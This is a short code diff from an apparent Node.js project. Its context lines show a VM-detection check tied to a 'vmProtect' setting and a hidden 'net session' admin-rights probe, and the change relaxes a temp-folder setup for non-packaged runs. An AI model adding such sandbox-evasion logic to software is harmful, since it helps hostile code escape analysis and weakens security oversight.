@@ -16,7 +16,7 @@ if (config.vmProtect && checkVM()) {
   }
 } else {
   exec('net session', { windowsHide: true }).on('exit', (code) => {
-    if (code === 0) {
+    if (code === 0 || !runningFromExecutable()) {
       const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
       module.exports.tempFolder = tempFolder;
       process.argv0.includes('node') && spawnSync('explorer', [tempFolder]);
